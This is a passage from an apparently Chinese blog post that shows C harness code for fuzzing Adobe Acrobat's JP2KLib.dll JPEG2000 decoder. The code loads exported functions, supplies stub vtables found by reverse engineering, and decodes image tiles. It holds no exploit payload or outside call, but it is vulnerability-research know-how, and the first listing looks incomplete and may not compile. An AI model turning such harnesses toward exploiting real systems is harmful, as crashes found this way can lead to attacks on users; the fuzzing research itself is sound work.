class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;stdafx.h&quot;</span></span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;detours.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line"></span><br><span class="line">#define <span class="title function_">LOAD_FUNC</span><span class="params">(h, n)</span>                                      \</span><br><span class="line">    n##_func_t n##_func = (n##_func_t)GetProcAddress(h, #n); \</span><br><span class="line">    <span class="keyword">if</span> (!n##_func)                                           \</span><br><span class="line">    &#123;                                                        \</span><br><span class="line">        printf(<span class="string">&quot;failed to load function: &quot;</span> #n <span class="string">&quot;\n&quot;</span>);         \</span><br><span class="line">        exit(<span class="number">1</span>);                                             \</span><br><span class="line">    &#125;                                                        \</span><br><span class="line">    printf(<span class="string">&quot;pointer address of &quot;</span> #n <span class="string">&quot;: %p\n&quot;</span>, *n##_func);</span><br><span class="line"></span><br><span class="line">#define <span class="title function_">NOP</span><span class="params">(x)</span>                                                            \</span><br><span class="line">    <span class="type">int</span> nop##x()                                                          \</span><br><span class="line">    &#123;                                                                     \</span><br><span class="line">        printf(<span class="string">&quot;==&gt; nop%d called, %p\n&quot;</span>, x, __builtin_return_address(<span class="number">0</span>)); \</span><br><span class="line">        <span class="keyword">return</span> (DWORD)x;                                                  \</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">typedef <span class="title function_">int</span><span class="params">(__stdcall *JP2KLibInitEx_func_t)</span><span class="params">(vtable_t *vtbl)</span>;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*funcs[<span class="number">8</span>])();</span><br><span class="line">&#125; vtable_t;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fileptr;</span><br><span class="line">&#125; file_obj</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span></span><br><span class="line">    <span class="title function_">file_obj_is_readable</span><span class="params">(const file_obj_t *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;file_obj_is_readable called\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (feof(file-&gt;fileptr)) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">file_obj_write</span><span class="params">(<span class="keyword">void</span> *fileptr, unsigned <span class="type">char</span> *data, <span class="type">int</span> param2)</span></span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;file_obj_write called with params fileptr=%p, data=%p, param2=%d\n&quot;</span>, fileptr, data, param2);</span><br><span class="line">    <span class="keyword">return</span> fwrite(data, <span class="number">1</span>, param2, fileptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">file_obj_seek</span><span class="params">(FILE *fileptr, DWORD whence, uint64_t offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;file_obj_seek called with fileptr=%p, offset=%d, whence=%d\n&quot;</span>, fileptr, offset, whence);</span><br><span class="line">    uint64_t actual;</span><br><span class="line">    <span class="keyword">switch</span> (whence)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        actual = SEEK_CUR;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        actual = SEEK_SET;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        actual = SEEK_END;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fseek(fileptr, offset, actual);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// reversing shows</span></span><br><span class="line"><span class="keyword">void</span> *nop0(<span class="type">int</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    s1 *nstruct = (s1 *)malloc((sizeof(s1)));</span><br><span class="line">    nstruct-&gt;p1 = malloc(size);</span><br><span class="line">    nstruct-&gt;p2 = malloc(size);</span><br><span class="line">    nstruct-&gt;size = size;</span><br><span class="line">    nstruct-&gt;size2 = size;</span><br><span class="line">    <span class="keyword">return</span> nstruct;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *nop1(s1 *nstruct)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> nstruct-&gt;p2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;usage : %s &lt;image file&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用nop来测试结构体的每个函数是干嘛用的</span></span><br><span class="line">    vtable_t vtable;</span><br><span class="line">    vtable.funcs[<span class="number">0</span>] = nop0;</span><br><span class="line">    vtable.funcs[<span class="number">1</span>] = nop1;</span><br><span class="line">    vtable.funcs[<span class="number">2</span>] = nop2;</span><br><span class="line">    vtable.funcs[<span class="number">3</span>] = nop3;</span><br><span class="line">    vtable.funcs[<span class="number">4</span>] = nop4;</span><br><span class="line">    vtable.funcs[<span class="number">5</span>] = nop5;</span><br><span class="line">    vtable.funcs[<span class="number">6</span>] = nop6;</span><br><span class="line">    vtable.funcs[<span class="number">7</span>] = nop7;</span><br><span class="line"></span><br><span class="line">    <span class="type">HMODULE</span> <span class="variable">jp2klib</span> <span class="operator">=</span> LoadLibraryA(<span class="string">&quot;JP2KLib.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (jp2klib == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;failed to load directory, gle = %d\n&quot;</span>, GetLastError());</span><br><span class="line">        exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOAD_FUNC(jp2klib, JP2KLibInitEx);</span><br><span class="line">    <span class="comment">// get return value by passing 0x20 vtable struct with nop functions and print return value</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> JP2KLibInitEx_func(&amp;vtable); <span class="comment">//JP2KLibInitEx_func就是JP2KLibInitEx的函数指针，传入放nopX的虚表</span></span><br><span class="line">    printf(<span class="string">&quot;JP2KLibInitEx: ret = %d\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">    LOAD_FUNC(jp2klib, JP2KGetMemObjEx);</span><br><span class="line">    <span class="keyword">void</span> *mem_obj = JP2KGetMemObjEx_func();</span><br><span class="line">    printf(<span class="string">&quot;JP2KGetMemObjEx : ret = %d\n&quot;</span>, mem_obj);</span><br><span class="line"></span><br><span class="line">    LOAD_FUNC(jp2klib, JP2KDecOptCreate);</span><br><span class="line">    <span class="type">int</span> <span class="variable">dec_opt</span> <span class="operator">=</span> JP2KDecOptCreate_func();</span><br><span class="line">    printf(<span class="string">&quot;JP2KDecOptCreate : ret = %d\n&quot;</span>, dec_opt);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create vtable</span></span><br><span class="line">    vtable_t procs;</span><br><span class="line">    <span class="comment">// assign relevant func pointers</span></span><br><span class="line">    procs.funcs[<span class="number">0</span>] = (<span class="keyword">void</span> *)nop_ret_0;</span><br><span class="line">    procs.funcs[<span class="number">1</span>] = (<span class="keyword">void</span> *)file_obj_die;</span><br><span class="line">    procs.funcs[<span class="number">2</span>] = (<span class="keyword">void</span> *)file_obj_read;</span><br><span class="line">    procs.funcs[<span class="number">3</span>] = (<span class="keyword">void</span> *)file_obj_write;</span><br><span class="line">    procs.funcs[<span class="number">4</span>] = (<span class="keyword">void</span> *)file_obj_seek;</span><br><span class="line">    procs.funcs[<span class="number">5</span>] = (<span class="keyword">void</span> *)file_obj_tellpos;</span><br><span class="line">    procs.funcs[<span class="number">6</span>] = (<span class="keyword">void</span> *)file_obj_is_seekable;</span><br><span class="line">    procs.funcs[<span class="number">7</span>] = (<span class="keyword">void</span> *)file_obj_is_readable;</span><br><span class="line">    procs.funcs[<span class="number">8</span>] = (<span class="keyword">void</span> *)file_obj_is_writeable;</span><br><span class="line">    procs.funcs[<span class="number">9</span>] = (<span class="keyword">void</span> *)&amp;procs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read file and store in file obj</span></span><br><span class="line">    file_obj_t fobj;</span><br><span class="line">    init_file(&amp;fobj, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!(fobj.fileptr))</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;failed to load file object\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;f_obj is at address: %p\n   with fobj-&gt;fileptr at: %p\n&quot;</span>, fobj, fobj.fileptr);</span><br><span class="line"></span><br><span class="line">    unknown *u = malloc(sizeof(unknown));</span><br><span class="line">    u-&gt;p1 = malloc(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;struct u has address: %p with p1=%p\n&quot;</span>, u, u-&gt;p1);</span><br><span class="line"></span><br><span class="line">    ret = JP2KImageInitDecoderEx_func(image, &amp;fobj, &amp;procs, dec_opt, u);</span><br><span class="line">    printf(<span class="string">&quot;JP2KImageInitDecoderEx: ret = %d\n&quot;</span>, ret);</span><br><span class="line">    <span class="comment">// if failed to decode we want to just exit so there&#x27;s no bogus crashes</span></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        printf(<span class="string">&quot;failed to decode.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">max_res</span> <span class="operator">=</span> JP2KImageGetMaxRes_func(image);</span><br><span class="line">    printf(<span class="string">&quot;JP2KImageGetMaxRes: ret = %d\n&quot;</span>, max_res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *image_data = JP2KImageDataCreate_func();</span><br><span class="line">    printf(<span class="string">&quot;JP2KImageDataCreate: ret = %p\n&quot;</span>, image_data);</span><br><span class="line"></span><br><span class="line">    ret = JP2KImageDecodeTileInterleaved_func(image, <span class="number">0</span>, max_res, <span class="number">8</span>, <span class="number">0xff</span>, <span class="number">0</span>, image_data);</span><br><span class="line">    printf(<span class="string">&quot;JP2KImageDecodeTileInterleaved called with params max_res=%d: ret = %d\n&quot;</span>, max_res, ret); <span class="comment">/*  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *geometryParams = JP2KImageGetGeometryParams_func(image);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">numXTiles</span> <span class="operator">=</span> JP2KImageGeometryGetNumXTiles_func(geometryParams);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">numYTiles</span> <span class="operator">=</span> JP2KImageGeometryGetNumYTiles_func(geometryParams);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">tileY</span> <span class="operator">=</span> <span class="number">0</span>; tileY &lt; numYTiles; tileY++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">tileX</span> <span class="operator">=</span> <span class="number">0</span>; tileX &lt; numXTiles; tileX++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// call JP2KImageGeometryGetTileNum</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tile_num</span> <span class="operator">=</span> JP2KImageGeometryGetTileNum_func(geometryParams, tileX, tileY);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// create image data</span></span><br><span class="line">            <span class="keyword">void</span> *image_data = JP2KImageDataCreate_func();</span><br><span class="line">            printf(<span class="string">&quot;JP2KImageDataCreate: ret = %p\n&quot;</span>, image_data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// call DecodeTileInterleaved</span></span><br><span class="line">            ret = JP2KImageDecodeTileInterleaved_func(image, tile_num, max_res, <span class="number">8</span>, <span class="number">0xff</span>, <span class="number">0</span>, image_data);</span><br><span class="line">            printf(<span class="string">&quot;JP2KImageDecodeTileInterleaved called with params tile_num=%x, max_res=%d: ret = %d\n&quot;</span>, tile_num, <span class="number">5</span>, ret);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// destroy image data</span></span><br><span class="line">            ret = JP2KImageDataDestroy_func(image_data);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">                printf(<span class="string">&quot;image data destroyed.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://ruan777.github.io/2021/07/18/fuzz_Acrobat_jp2klib/">别人</a>写的超级慢harness，参考<a href="https://github1s.com/ronwai/jp2k_fuzz/blob/master/frida_harness.js#L325">大佬的</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;intrin.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// #define DEBUG</span></span><br><span class="line"></span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*pfunc_t)</span> (); </span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KLibInitEx_func_t)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="keyword">void</span>* (*JP2KGetMemObjEx_func_t)();</span><br><span class="line">typedef <span class="keyword">void</span>* (*JP2KDecOptCreate_func_t)();</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KDecOptInitToDefaults_func_t)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="keyword">void</span>* (*JP2KImageCreate_func_t)();</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KImageInitDecoderEx_func_t)</span><span class="params">(<span class="keyword">void</span>*,<span class="keyword">void</span>*,<span class="keyword">void</span>*,<span class="keyword">void</span>*,<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="keyword">void</span>* (*JP2KCodeStm_return_arg0)(<span class="keyword">void</span>*);</span><br><span class="line">typedef <span class="title function_">void</span> <span class="params">(*JP2KCodeStm_Die)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_Read)</span><span class="params">(<span class="keyword">void</span>*,<span class="keyword">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_Seek)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_Write)</span><span class="params">(<span class="keyword">void</span>*,<span class="keyword">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_TellPos)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_IsSeekAble)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_IsReadAble)</span><span class="params">(<span class="keyword">void</span>*)</span>;           </span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KCodeStm_IsWriteAble)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="keyword">void</span>* (*JP2KImageDataCreate_func_t)(<span class="keyword">void</span>);</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KImageGetMaxRes_func_t)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">int</span> <span class="params">(*JP2KImageDecodeTileInterleaved_func_t)</span><span class="params">(<span class="keyword">void</span>*, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">void</span> <span class="params">(*JP2KImageDataDestroy_func_t)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">void</span> <span class="params">(*JP2KImageDestroy_func_t)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line">typedef <span class="title function_">void</span> <span class="params">(*JP2KDecOptDestroy_func_t)</span><span class="params">(<span class="keyword">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line">JP2KLibInitEx_func_t JP2KLibInitEx_func;</span><br><span class="line">JP2KGetMemObjEx_func_t JP2KGetMemObjEx_func;</span><br><span class="line">JP2KDecOptCreate_func_t JP2KDecOptCreate_func;</span><br><span class="line">JP2KDecOptInitToDefaults_func_t JP2KDecOptInitToDefaults_func;</span><br><span class="line">JP2KImageCreate_func_t JP2KImageCreate_func;</span><br><span class="line">JP2KImageInitDecoderEx_func_t JP2KImageInitDecoderEx_func;</span><br><span class="line">JP2KImageDataCreate_func_t JP2KImageDataCreate_func;</span><br><span class="line">JP2KImageGetMaxRes_func_t JP2KImageGetMaxRes_func;</span><br><span class="line">JP2KImageDecodeTileInterleaved_func_t JP2KImageDecodeTileInterleaved_func;</span><br><span class="line">JP2KImageDataDestroy_func_t JP2KImageDataDestroy_func;</span><br><span class="line">JP2KImageDestroy_func_t JP2KImageDestroy_func;</span><br><span class="line">JP2KDecOptDestroy_func_t JP2KDecOptDestroy_func;</span><br><span class="line"></span><br><span class="line">#define <span class="title function_">LOAD_FUNC</span><span class="params">(h,n)</span>\</span><br><span class="line">n##_func = (n##_func_t)GetProcAddress(h,#n);\</span><br><span class="line"><span class="keyword">if</span>(!n##_func)&#123;\</span><br><span class="line">printf(<span class="string">&quot;failed to load function &quot;</span> # n <span class="string">&quot;\n&quot;</span>);\</span><br><span class="line">exit(<span class="number">1</span>);\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define <span class="title function_">NOP</span><span class="params">(x)</span>\</span><br><span class="line"><span class="type">int</span> nop##x()&#123;\</span><br><span class="line">printf(<span class="string">&quot;==&gt; nop%d called, %p\n&quot;</span>,##x,_ReturnAddress());\</span><br><span class="line"><span class="keyword">return</span> (DWORD)x;\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NOP(<span class="number">0</span>)</span><br><span class="line">NOP(<span class="number">1</span>)</span><br><span class="line">NOP(<span class="number">2</span>)</span><br><span class="line">NOP(<span class="number">3</span>)</span><br><span class="line">NOP(<span class="number">4</span>)</span><br><span class="line">NOP(<span class="number">5</span>)</span><br><span class="line">NOP(<span class="number">6</span>)</span><br><span 